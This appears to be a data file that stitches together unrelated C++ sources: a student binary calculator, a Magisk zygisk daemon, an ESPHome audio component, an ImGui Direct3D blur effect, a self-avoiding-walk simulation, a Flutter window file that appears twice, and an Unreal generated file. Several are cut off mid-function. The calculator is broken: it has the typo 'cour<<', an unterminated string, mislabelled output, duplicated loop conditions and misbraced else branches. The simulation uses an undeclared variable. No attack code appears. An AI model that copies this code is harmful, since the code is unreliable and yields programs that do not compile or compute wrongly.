    "#include<iostream>\nusing namespace std;\n\nvoid add();\nvoid subt();\nvoid mul();\nvoid div();\nvoid ConvertAnother();\n\nint main() {\n\n    int choice;\n\n    cout<<\" \\t\\t      WELCOME_TO_BINARY_CALCULATOR!     \\n\";\n    cout<<\"\\t\\t         By GROUP-1 \\n\";\n    cour<<\"\\t\\t Created By: Edcor Zacal\n    cout<<endl;\n    cout<<\"PLEASE SELECT AN OPERATOR:   \\n[1.]ADDITION. \\n[2.]SUBTRACTION. \\n[3.]MULTIPLICATION \\n[4.]DIVISION.\";\n    cout<<endl<<\">>\";\n    cin>>choice;\n\n    if(choice==1) {\n        cout<<endl;\n        system(\"cls\");\n        add();\n    }\n    else if(choice==2) {\n        cout<<endl;\n        system(\"cls\");\n        subt();\n    }\n    else if(choice==3) {\n        cout<<endl;\n        system(\"cls\");\n        mul();\n    }\n    else if (choice==4) {\n        cout<<endl;\n        system(\"cls\");\n        div();\n    }\n    else {\n        cout<<endl;\n        cout<<\"INVALID_INPUT \\n\";\n        cout<<\"PLEASE TRY AGAIN!\";\n\n    }\n    //system(\"pause\");\n    return 0;\n}\n\nvoid add()\n{\n    int bin2, bin1, dec1=0, dec2=0, i1=1, i2=1, rem1, rem2, inspct=0, result=0;\n\n    cout<<\" Enter the First Binary Number: \";\n    cin>>bin1;\n    cout<<\" Enter the Second Binary Number: \";\n    cin>>bin2;\n\n    while(bin1!=0 || bin2!=0)\n    {\n        rem1 = bin1%10;\n        rem2 = bin2%10;\n        if(rem1>1 && rem2>1)\n        {   inspct++;\n            break;\n        }\n        dec1 = dec1 + (rem1*i1);\n        dec2 = dec2 + (rem2*i2);\n        i1 = i1*2;\n        i2 = i2*2;\n        bin1 = bin1/10;\n        bin2 = bin2/10;\n    }\n    if(inspct==0)\n    {\n\n\n        result=dec1+dec2;\n        cout<<\"Decimal Values: \";\n        cout<<dec1<<\" * \"<<dec2<<\" = \"<<result;\n        int DeciNum, BinNum[20], i=0;\n        DeciNum = result;\n        while(DeciNum!=0)\n        {\n            BinNum[i] = DeciNum%2;\n            i++;\n            DeciNum = DeciNum/2;\n\n        }\n        cout<<\"\\nEquivalent Binary Result: \";\n        for(i=(i-1); i>=0; i--)\n            cout<<BinNum[i];\n        cout<<endl;\n\n    } else\n        system(\"cls\");\n    cout<<\"Invalid\";\n\n    ConvertAnother();\n    cout<<endl;\n\n}\nvoid subt()\n{\n    int bin1, bin2, dec1=0, dec2=0, i1=1, i2=1, inspct=0, rem1, rem2, result=0;\n    cout<<\"Enter First Binary Number: \";\n    cin>>bin1;\n    cout<<\"Enter Second Binary Number: \";\n    cin>>bin2;\n    while(bin1!=0 && bin1!=0)\n    {\n        rem1 = bin1%10;\n        rem2 = bin2%10;\n        if(rem1>1&&rem2>1)\n        {   inspct++;\n            break;\n        }\n        dec1 = dec1 + (rem1*i1);\n        dec2 = dec2 + (rem2*i2);\n        i1 = i1*2;\n        i2 = i2*2;\n        bin1 = bin1/10;\n        bin2 = bin2/10;\n    }\n    if(inspct==0)\n    {\n        result=dec1-dec2;\n        cout<<\"Decimal Values: \";\n        cout<<dec1<<\" * \"<<dec2<<\" = \"<<result;\n        int DeciNum, BinNum[20], i=0;\n        DeciNum=result;\n        while(DeciNum!=0)\n        {\n            BinNum[i] = DeciNum%2;\n            i++;\n            DeciNum = DeciNum/2;\n        }\n        cout<<\"\\nEquivalent Binary Result: \";\n        for(i=(i-1); i>=0; i--)\n            cout<<BinNum[i];\n        cout<<endl;\n    } else\n        system(\"cls\");\n    cout<<\"Invalid\";\n\n    ConvertAnother();\n    cout<<endl;\n\n}\nvoid  mul()\n{\n    int bin1, bin2, dec1=0, dec2=0, i1=1, i2=1, inspct=0, rem1, rem2, result = 0;\n\n    cout<<\" Enter the First Binary Number: \";\n    cin>>bin1;\n    cout<<\" Enter the Second Binary Number: \";\n    cin>>bin2;\n    while(bin1!=0 && bin1!=0)\n    {\n        rem1 = bin1%10;\n        rem2 = bin2%10;\n        if(rem1>1&&rem2>1)\n        {   inspct++;\n            break;\n        }\n        dec1 = dec1 + (rem1*i1);\n        dec2 = dec2 + (rem2*i2);\n        i1 = i1*2;\n        i2 = i2*2;\n        bin1 = bin1/10;\n        bin2 = bin2/10;\n    }\n    if(inspct==0)\n    {\n        result = dec1*dec2;\n        cout<<\"Decimal Values: \";\n        cout<<dec1<<\" * \"<<dec2<<\" = \"<<result;\n        int DeciNum, BinNum[20], i=0;\n        DeciNum = result;\n        while(DeciNum!=0)\n        {\n            BinNum[i] = DeciNum%2;\n            i++;\n            DeciNum = DeciNum/2;\n\n        }\n        cout<<\"\\nEquivalent Binary Result: \";\n        for(i=(i-1); i>=0; i--)\n\n            cout<<BinNum[i];\n        cout<<endl;\n\n\n    } else\n        system(\"cls\");\n    cout<<\"Invalid\";\n\n    ConvertAnother();\n    cout<<endl;\n\n}\nvoid div()\n{\n    int bin1, bin2, dec1=0, dec2=0, i1=1, i2=1, inspct=0, rem1, rem2, result =0;\n\n    cout<<\"Enter the First Binary Number: \";\n    cin>>bin1;\n    cout<<\"Enter the Second Binary Number: \";\n    cin>>bin2;\n    while(bin1!=0 && bin1!=0)\n    {\n        rem1 = bin1%10;\n        rem2 = bin2%10;\n        if(rem1>1 && rem2>1)\n        {   inspct++;\n            break;\n        }\n        dec1 = dec1 + (rem1*i1);\n        dec2 = dec2 + (rem2*i2);\n        i1 = i1*2;\n        i2 = i2*2;\n        bin1 = bin1/10;\n        bin2 = bin2/10;\n    }\n    if(inspct==0)\n    {\n        result=dec1/dec2;\n\n        cout<<\"Decimal Values: \";\n        cout<<dec1<<\" / \"<<dec2<<\" = \"<<result;\n        int DeciNum, BinNum[20], i=0;\n        DeciNum = result;\n        while(DeciNum!=0)\n        {\n     ",
    "#include <sys/mount.h>\n#include <android/dlext.h>\n#include <dlfcn.h>\n\n#include <consts.hpp>\n#include <base.hpp>\n#include <core.hpp>\n#include <selinux.hpp>\n\n#include \"zygisk.hpp\"\n\nusing namespace std;\n\nstatic void zygiskd(int socket) {\n    if (getuid() != 0 || fcntl(socket, F_GETFD) < 0)\n        exit(-1);\n\n    init_thread_pool();\n\n#if defined(__LP64__)\n    set_nice_name(\"zygiskd64\");\n    LOGI(\"* Launching zygiskd64\\n\");\n#else\n    set_nice_name(\"zygiskd32\");\n    LOGI(\"* Launching zygiskd32\\n\");\n#endif\n\n    // Load modules\n    using comp_entry = void(*)(int);\n    vector<comp_entry> modules;\n    {\n        vector<int> module_fds = recv_fds(socket);\n        for (int fd : module_fds) {\n            comp_entry entry = nullptr;\n            struct stat s{};\n            if (fstat(fd, &s) == 0 && S_ISREG(s.st_mode)) {\n                android_dlextinfo info {\n                    .flags = ANDROID_DLEXT_USE_LIBRARY_FD,\n                    .library_fd = fd,\n                };\n                if (void *h = android_dlopen_ext(\"/jit-cache\", RTLD_LAZY, &info)) {\n                    *(void **) &entry = dlsym(h, \"zygisk_companion_entry\");\n                } else {\n                    LOGW(\"Failed to dlopen zygisk module: %s\\n\", dlerror());\n                }\n            }\n            modules.push_back(entry);\n            close(fd);\n        }\n    }\n\n    // ack\n    write_int(socket, 0);\n\n    // Start accepting requests\n    pollfd pfd = { socket, POLLIN, 0 };\n    for (;;) {\n        poll(&pfd, 1, -1);\n        if (pfd.revents && !(pfd.revents & POLLIN)) {\n            // Something bad happened in magiskd, terminate zygiskd\n            exit(0);\n        }\n        int client = recv_fd(socket);\n        if (client < 0) {\n            // Something bad happened in magiskd, terminate zygiskd\n            exit(0);\n        }\n        int module_id = read_int(client);\n        if (module_id >= 0 && module_id < modules.size() && modules[module_id]) {\n            exec_task([=, entry = modules[module_id]] {\n                struct stat s1;\n                fstat(client, &s1);\n                entry(client);\n                // Only close client if it is the same file so we don't\n                // accidentally close a re-used file descriptor.\n                // This check is required because the module companion\n                // handler could've closed the file descriptor already.\n                if (struct stat s2; fstat(client, &s2) == 0) {\n                    if (s1.st_dev == s2.st_dev && s1.st_ino == s2.st_ino) {\n                        close(client);\n                    }\n                }\n            });\n        } else {\n            close(client);\n        }\n    }\n}\n\n// Entrypoint where we need to re-exec ourselves\n// This should only ever be called internally\nint zygisk_main(int argc, char *argv[]) {\n    android_logging();\n    if (argc == 3 && argv[1] == \"companion\"sv) {\n        zygiskd(parse_int(argv[2]));\n    }\n    return 0;\n}\n",
    "#include \"nabu.h\"\n\n#ifdef USE_ESP_IDF\n\n#include <driver/i2s.h>\n#include <string.h>\n\n#include <vector>\n\n// #include <audio_element.h>\n// #include <audio_event_iface.h>\n// #include <audio_pipeline.h>\n// #include <downmix.h>\n// #include <driver/i2s.h>\n// #include <filter_resample.h>\n// #include <http_stream.h>\n// #include <i2s_stream.h>\n// #include <mp3_decoder.h>\n// #include <raw_stream.h>\n\n// #include \"i2s_stream_mod.h\"\n// #include \"sdk_ext.h\"\n\n// #define INDEX_MUSIC_STREAM 0\n// #define INDEX_TTS_STREAM 1\n// #define TRANSMIT_TIME 500\n\n#include \"esphome/core/log.h\"\n\nnamespace esphome {\nnamespace nabu {\n\nstatic const char *const TAG = \"nabu\";\n\nvoid NabuComponent::setup() {\n  // audio_event_iface_cfg_t evt_cfg = AUDIO_EVENT_IFACE_DEFAULT_CFG();\n  // this->pipeline_event_ = audio_event_iface_init(&evt_cfg);\n\n  // this->setup_pipeline_mix_();\n  // this->setup_pipeline_music_();\n  // this->setup_pipeline_tts_();\n  // this->setup_pipeline_mic_();\n\n  // audio_pipeline_run(this->pipeline_mic_);\n}\n\nvoid NabuComponent::loop() {\n  // audio_event_iface_msg_t msg{};\n  // audio_event_iface_listen(this->pipeline_event_, &msg, 0);\n\n  // if (this->state_ == State::STARTING) {\n  //   ESP_LOGD(TAG, \"Starting mix pipeline\");\n  //   audio_pipeline_run(this->pipeline_mix_);\n  // this->state_ = State::IDLE;\n\n  // this->play_music(\"http://192.168.68.75:8000/Charly%20Bliss/Young%20Enough/\"\n  //                  \"06%20-%20Young%20Enough.mp3\");\n  // }\n  // audio_event_iface_discard(this->pipeline_event_);\n\n  // if ((this->state_ == State::PREPARING_MUSIC) &&\n  //     (audio_element_get_state(this->mp3_decoder_) == AEL_STATE_RUNNING)) {\n  //   audio_element_info_t music_info{};\n  //   audio_element_getinfo(this->mp3_decoder_, &music_info);\n  //   ESP_LOGD(TAG, \"Received music info\");\n\n  //   // Change resample filter to match music source\n  //   rsp_filter_change_src_info(this->resample_music_,\n  //   music_info.sample_rates,\n  //                              music_info.channels, music_info.bits);\n\n  //   this->stop_music();\n\n  //   // Run music pipeline\n  //   this->state_ = State::PLAYING_MUSIC;\n  //   audio_element_set_uri(this->http_reader_, this->music_uri_.c_str());\n  //   audio_pipeline_run(this->pipeline_music_);\n  // }\n}\n\n// ----------------------------------------------------------------------------\n\nvoid NabuComponent::start_i2s() {\n  if (this->i2s_started_) {\n    return;\n  }\n\n  ESP_LOGD(TAG, \"Starting I2S\");\n  i2s_driver_config_t i2s_driver_cfg = {\n      .mode = (i2s_mode_t)(I2S_MODE_SLAVE | I2S_MODE_RX | I2S_MODE_TX),\n      .sample_rate = 16000,\n      .bits_per_sample = I2S_BITS_PER_SAMPLE_32BIT,\n      // .channel_format = I2S_CHANNEL_FMT_ONLY_LEFT,\n      .channel_format = I2S_CHANNEL_FMT_RIGHT_LEFT,\n      .communication_format = I2S_COMM_FORMAT_STAND_I2S,\n      .intr_alloc_flags = ESP_INTR_FLAG_LEVEL1,\n      .dma_buf_count = 8,\n      .dma_buf_len = 128,\n      // .dma_buf_count = 4,\n      // .dma_buf_len = 256,\n      .use_apll = false,\n      .tx_desc_auto_clear = false,\n      // .tx_desc_auto_clear = true,\n      // .fixed_mclk = 0,\n      // .fixed_mclk = 24576000,\n      // .mclk_multiple = I2S_MCLK_MULTIPLE_DEFAULT,\n      .bits_per_chan = I2S_BITS_PER_CHAN_DEFAULT,\n  };\n  i2s_driver_install(this->get_port(), &i2s_driver_cfg, 0, nullptr);\n\n  i2s_pin_config_t pin_config = this->get_pin_config();\n  i2s_set_pin(this->get_port(), &pin_config);\n  this->i2s_started_ = true;\n}\n\nvoid NabuComponent::play_music(const std::string &uri) {\n  // this->stop_music();\n\n  ESP_LOGD(TAG, \"Playing: %s\", uri.c_str());\n  // this->music_uri_ = uri;\n  // audio_element_set_uri(this->http_reader_, this->music_uri_.c_str());\n  // audio_element_set_uri(this->http_reader_, uri.c_str());\n  // audio_pipeline_run(this->pipeline_music_);\n\n  // Preroll HTTP reader and MP3 decoder to get music info (see loop)\n  // this->state_ = State::PREPARING_MUSIC;\n\n  // if (audio_element_run(this->http_reader_) != ESP_OK) {\n  //   ESP_LOGE(TAG, \"Starting http reader failed\");\n  // }\n  // if (audio_element_run(this->mp3_decoder_) != ESP_OK) {\n  //   ESP_LOGE(TAG, \"Starting MP3 decoder failed\");\n  // }\n  // if (audio_element_resume(this->http_reader_, 0, 2000 / portTICK_RATE_MS) !=\n  //     ESP_OK) {\n  //   ESP_LOGE(TAG, \"Resuming http reader failed\");\n  // }\n  // if (audio_element_resume(this->mp3_decoder_, 0, 2000 / portTICK_RATE_MS) !=\n  //     ESP_OK) {\n  //   ESP_LOGE(TAG, \"Resuming MP3 decoder failed\");\n  // }\n\n  // ESP_LOGD(TAG, \"Waiting for music info\");\n}\n\nvoid NabuComponent::stop_music() {\n  // audio_pipeline_stop(this->pipeline_music_);\n  // audio_pipeline_reset_items_state(this->pipeline_music_);\n  // audio_pipeline_reset_ringbuffer(this->pipeline_music_);\n}\n\nvoid NabuComponent::pause_music() {\n  // audio_pipeline_pause(this->pipeline_music_);\n}\n\nvoid NabuComponent::resume_music() {\n  // audio_pipeline_resume(this->pipeline_music_);\n}\n\n// ----------------------------------------------------------------------------\n\n// void NabuComponent::setup_pipeline_mix_() {\n",
    "#include \"blur.hpp\"\r\n\r\n#include \"blur_x.h\"\r\n#include \"blur_y.h\"\r\n#include <iostream>\r\n\r\nstatic IDirect3DSurface9* rtBackup = nullptr;\r\nstatic IDirect3DPixelShader9* blurShaderX = nullptr;\r\nstatic IDirect3DPixelShader9* blurShaderY = nullptr;\r\nstatic IDirect3DTexture9* blurTexture = nullptr;\r\nstatic int backbufferWidth = 0;\r\nstatic int backbufferHeight = 0;\r\n\r\nstatic void BeginBlur(const ImDrawList* parent_list, const ImDrawCmd* cmd)\r\n{\r\n\tconst auto device = reinterpret_cast<IDirect3DDevice9*>(cmd->UserCallbackData);\r\n\r\n\tif (!blurShaderX)\r\n\t{\r\n\t\tdevice->CreatePixelShader(reinterpret_cast<const DWORD*>(blur_x.data()), &blurShaderX);\r\n\t}\r\n\r\n\tif (!blurShaderY)\r\n\t{\r\n\t\tdevice->CreatePixelShader(reinterpret_cast<const DWORD*>(blur_y.data()), &blurShaderY);\r\n\t}\r\n\r\n\tIDirect3DSurface9* backBuffer = nullptr;\r\n\tD3DSURFACE_DESC desc;\r\n\r\n\tif ( !blurTexture ) {\r\n\t\tdevice->GetBackBuffer(0, 0, D3DBACKBUFFER_TYPE_MONO, &backBuffer);\r\n\t\tbackBuffer->GetDesc(&desc);\r\n\r\n\t\tif (backbufferWidth != desc.Width || backbufferHeight != desc.Height)\r\n\t\t{\r\n\t\t\tbackbufferWidth = desc.Width;\r\n\t\t\tbackbufferHeight = desc.Height;\r\n\t\t\tdevice->CreateTexture(desc.Width, desc.Height, 1, D3DUSAGE_RENDERTARGET, D3DFMT_A8R8G8B8, D3DPOOL_DEFAULT, &blurTexture, nullptr);\r\n\t\t}\r\n\t}\r\n\r\n\tdevice->GetRenderTarget(0, &rtBackup);\r\n\r\n\tIDirect3DSurface9* surface;\r\n\tblurTexture->GetSurfaceLevel(0, &surface);\r\n\tdevice->StretchRect(backBuffer, NULL, surface, NULL, D3DTEXF_NONE);\r\n\tdevice->SetRenderTarget(0, surface);\r\n\tsurface->Release();\r\n\r\n\tif ( !blurTexture ) backBuffer->Release( );\r\n\r\n\tdevice->SetSamplerState(0, D3DSAMP_ADDRESSU, D3DTADDRESS_CLAMP);\r\n\tdevice->SetSamplerState(0, D3DSAMP_ADDRESSV, D3DTADDRESS_CLAMP);\r\n}\r\n\r\nstatic void FirstBlurPass(const ImDrawList* parent_list, const ImDrawCmd* cmd)\r\n{\r\n\tconst auto device = reinterpret_cast<IDirect3DDevice9*>(cmd->UserCallbackData);\r\n\r\n\tdevice->SetPixelShader(blurShaderX);\r\n\tconst float params[4] = { 1.0f / backbufferWidth };\r\n\tdevice->SetPixelShaderConstantF(0, params, 1);\r\n}\r\n\r\nstatic void SecondBlurPass(const ImDrawList* parent_list, const ImDrawCmd* cmd)\r\n{\r\n\tconst auto device = reinterpret_cast<IDirect3DDevice9*>(cmd->UserCallbackData);\r\n\r\n\tdevice->SetPixelShader(blurShaderY);\r\n\tconst float params[4] = { 1.0f / backbufferHeight };\r\n\tdevice->SetPixelShaderConstantF(0, params, 1);\r\n}\r\n\r\nstatic void EndBlur(const ImDrawList* parent_list, const ImDrawCmd* cmd)\r\n{\r\n\tconst auto device = reinterpret_cast<IDirect3DDevice9*>(cmd->UserCallbackData);\r\n\r\n\tdevice->SetRenderTarget(0, rtBackup);\r\n\trtBackup->Release();\r\n\r\n\tdevice->SetPixelShader(nullptr);\r\n\tdevice->SetSamplerState(0, D3DSAMP_ADDRESSU, D3DTADDRESS_WRAP);\r\n\tdevice->SetSamplerState(0, D3DSAMP_ADDRESSV, D3DTADDRESS_WRAP);\r\n}\r\n\r\ninline void DrawBackgroundBlur(ImDrawList* drawList, ImVec2 min, ImVec2 max, float rounding, ImDrawFlags flags, LPDIRECT3DDEVICE9 device, float anim)\r\n{\r\n\tdrawList->AddCallback(BeginBlur, device);\r\n\r\n\tfor (int i = 0; i < 10 * anim; ++i) {\r\n\t\tif ( !blurTexture )\r\n\t\t\tbreak;\r\n\r\n\t\tdrawList->AddCallback(FirstBlurPass, device);\r\n\t\tdrawList->AddImage(blurTexture, { 0.0f, 0.0f }, { backbufferWidth * 1.0f, backbufferHeight * 1.0f }, { 0, 0 }, { 1, 1 }, ImColor( 1.f, 1.f, 1.f, ImGui::GetStyle( ).Alpha ));\r\n\t\tdrawList->AddCallback(SecondBlurPass, device);\r\n        drawList->AddImage(blurTexture, { 0.0f, 0.0f }, { backbufferWidth * 1.0f, backbufferHeight * 1.0f }, { 0, 0 }, { 1, 1 }, ImColor( 1.f, 1.f, 1.f, ImGui::GetStyle( ).Alpha ));\r\n\t}\r\n\r\n\tdrawList->AddCallback(EndBlur, device );\r\n\tif ( blurTexture )\tdrawList->AddImageRounded(blurTexture, min, max, min / ImGui::GetIO( ).DisplaySize, max / ImGui::GetIO( ).DisplaySize, ImColor( 1.f, 1.f, 1.f, ImGui::GetStyle( ).Alpha ), rounding, flags);\r\n}\r\n",
    "#include <iostream>\n#include <cstdlib>\n#include <vector>\n#include <set>\n#include <bits/stdc++.h>\n#include <array>\n#include <cmath>\n#include <algorithm>\n#include <random>\nusing namespace std;\n\n\ndouble Pplus(double x, double z)\n{\n    //Acceptance probability for positive move\n    return min(1.0,x*(z-1.0));\n}\n\ndouble Pneg(double x, double z)\n{\n    //Acceptance probability for negative move\n    return min(1.0,1.0/(x*(z-1.0)));\n}\n\nvector<int> ThreeMoveBerrettiSokal(double x, double z, double d, int n, int desired_length)\n{\n    vector<int> row(d);\n    vector<int> temp_row(d);\n    vector<int> length_per_step;\n    //make coordinates vector the length of n and cut off where necessary at the end\n    //maximum length of coordinates is n \n\n    vector<vector<int>> coordinates;\n    //need a temp coords vector for neutral moves in case we need to go back \n    vector<vector<int>> temp_coordinates;\n    coordinates.push_back(row);\n    temp_coordinates = coordinates;\n    set<vector<int>> checker;\n\n    //update the length and append set at the same time\n    //if values are the same, new coord is valid \n    int length {1};\n    checker.insert(row);\n\n    //initialise a vector to store all directions and store the current SAW checker set\n    //Make it of length n, this is the maximum length that could be needed\n    \n    vector<int> prev_directions;\n    vector<int> temp_prev_directions;\n    \n    int prev_dir;\n    \n    //Random number generator for getting the direction \n    default_random_engine generator(random_device{}());\n    uniform_int_distribution<int> direction(1,2*d);\n    uniform_int_distribution<int> percent(1,100);\n\n    \n\n    //second random number generator to determine which move to make\n    uniform_int_distribution<int> atmosphere_choice(1,2);\n    uniform_int_distribution<int> neutral_fifty(1,2);\n    int move {0};\n    int step {0};\n    double acc {0};\n    double r {0};\n    int random_number, removal;\n    double index {0};\n    //int neutral_check{0};\n    int neutral{0};\n    \n    bool zeros = std::all_of(row.begin(), row.end(), [](int i) { return i==0; });\n\n    while (length < desired_length)\n    {\n        break_point+=1;\n        if (break_point == n)\n        {\n            break;\n        }\n        std::cout << \"\\n\";\n        std::cout << \"For Loop \\n\";\n        //std::cout << \"Neutral Check\" << neutral_check << \"\\n\";\n        //First move is positive move unbounded to any direction\n        //std::cout << \"\\n\";\n        //std::cout <<\"Before Move Row: \"<< row[0] << \" \" << row[1] << \"\\n\"; \n\n        zeros = std::all_of(row.begin(), row.end(), [](int j) { return j==0; });\n        if (zeros == true)\n        {\n            std::cout << \"At Origin \\n\";\n            //check to see if the move should be accepted\n            acc = Pplus(x,z);\n            if (acc < 1)\n            {\n                acc = acc*100;\n                r = percent(generator);\n                \n                if (r > acc)\n                {\n                    //std::cout << \"Failed \\n\";\n                    length_per_step.push_back(length);\n                    continue;\n                }\n            }\n            \n            step = direction(generator);\n            //std::cout << \"Step in: \"<< step <<\" Directions \\n\";\n            prev_directions.push_back(step);    \n            if (step%2 == 0)\n            {\n                index = (step/2) -1;\n                //make step\n                row[index] = row[index] - 1;\n                temp_row[index] = temp_row[index] - 1;\n            }\n            else if (step%2 !=0)\n            {   \n                step += 1;\n                index = (step/2) -1;\n                //make step\n                row[index] = row[index] + 1;\n                temp_row[index] = temp_row[index] + 1;\n            }\n            coordinates.push_back(row);\n            checker.insert(row);\n            length += 1;\n            temp_coordinates = coordinates;\n            temp_prev_directions = prev_directions;\n            length_per_step.push_back(length);\n        }\n\n        else \n        {\n            //If move is 1 > positive move to be made\n            //If move = 2 > negative move\n            move = atmosphere_choice(generator);\n            //cout << move << \"\\n\";\n            //neutral_check = 0;\n            //While loop always active\n            //Want to break it when a valid move has been made\n            //Want to continue if the neutral move failed\n            while(1)\n            {\n                \n                std::cout << \"While Loop \\n\";\n                //std::cout << \"Neutral Check\" << neutral_check << \"\\n\";\n\n                if (move == 1)\n                {   \n                    std::cout << \"Positive Atmosphere \\n\";\n\n                    neutral = neutral_fifty(generator);\n\n                    if (neutral == 1)\n                    {\n                        std::cout << \"Neutral \\n\";\n                        \n                        //set temp storage of our current values\n                        temp_coordinates = coordinates;\n   ",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "// Copyright Epic Games, Inc. All Rights Reserved.\n/*===========================================================================\n\tGenerated code exported from UnrealHeaderTool.\n\tDO NOT modify this manually! Edit the corresponding .h files instead!\n===========================================================================*/\n\n#include \"UObject/GeneratedCppIncludes.h\"\n#include \"ManagerUI/Public/WidgetReactionInterface.h\"\nPRAGMA_DISABLE_DEPRECATION_WARNINGS\nvoid EmptyLinkFunctionForGeneratedCodeWidgetReactionInterface() {}\n// Cross Module References\n\tCOREUOBJECT_API UClass* Z_Construct_UClass_UInterface();\n\tMANAGERUI_API UClass* Z_Construct_UClass_UWidgetReactionInterface();\n\tMANAGERUI_API UClass* Z_Construct_UClass_UWidgetReactionInterface_NoRegister();\n\tUPackage* Z_Construct_UPackage__Script_ManagerUI();\n// End Cross Module References\n\tDEFINE_FUNCTION(IWidgetReactionInterface::execOnWidgetPopped)\n\t{\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\tP_THIS->OnWidgetPopped_Implementation();\n\t\tP_NATIVE_END;\n\t}\n\tDEFINE_FUNCTION(IWidgetReactionInterface::execOnWidgetPushed)\n\t{\n\t\tP_FINISH;\n\t\tP_NATIVE_BEGIN;\n\t\tP_THIS->OnWidgetPushed_Implementation();\n\t\tP_NATIVE_END;\n\t}\n\tvoid IWidgetReactionInterface::OnWidgetPopped()\n\t{\n\t\tcheck(0 && \"Do not directly call Event functions in Interfaces. Call Execute_OnWidgetPopped instead.\");\n\t}\n\tvoid IWidgetReactionInterface::OnWidgetPushed()\n\t{\n\t\tcheck(0 && \"Do not directly call Event functions in Interfaces. Call Execute_OnWidgetPushed instead.\");\n\t}\n\tvoid UWidgetReactionInterface::StaticRegisterNativesUWidgetReactionInterface()\n\t{\n\t\tUClass* Class = UWidgetReactionInterface::StaticClass();\n\t\tstatic const FNameNativePtrPair Funcs[] = {\n\t\t\t{ \"OnWidgetPopped\", &IWidgetReactionInterface::execOnWidgetPopped },\n\t\t\t{ \"OnWidgetPushed\", &IWidgetReactionInterface::execOnWidgetPushed },\n\t\t};\n\t\tFNativeFunctionRegistrar::RegisterFunctions(Class, Funcs, UE_ARRAY_COUNT(Funcs));\n\t}\n\tstruct Z_Construct_UFunction_UWidgetReactionInterface_OnWidgetPopped_Statics\n\t{\n#if WITH_METADATA\n\t\tstatic const UECodeGen_Private::FMetaDataPairParam Function_MetaDataParams[];\n#endif\n\t\tstatic const UECodeGen_Private::FFunctionParams FuncParams;\n\t};\n#if WITH_METADATA\n\tconst UECodeGen_Private::FMetaDataPairParam Z_Construct_UFunction_UWidgetReactionInterface_OnWidgetPopped_Statics::Function_MetaDataParams[] = {\n\t\t{ \"Category\", \"Widget Reaction\" },\n\t\t{ \"Comment\", \"/**\\n\\x09* Defines the reaction when the widget is popped.\\n\\x09* This function can be overridden to implement specific behavior.\\n\\x09*/\" },\n\t\t{ \"ModuleRelativePath\", \"Public/WidgetReactionInterface.h\" },\n\t\t{ \"ToolTip\", \"Defines the reaction when the widget is popped.\\nThis function can be overridden to implement specific behavior.\" },\n\t};\n#endif\n\tconst UECodeGen_Private::FFunctionParams Z_Construct_UFunction_UWidgetReactionInterface_OnWidgetPopped_Statics::FuncParams = { (UObject*(*)())Z_Construct_UClass_UWidgetReactionInterface, nullptr, \"OnWidgetPopped\", nullptr, nullptr, nullptr, 0, 0, RF_Public|RF_Transient|RF_MarkAsNative, (EFunctionFlags)0x0C020C00, 0, 0, 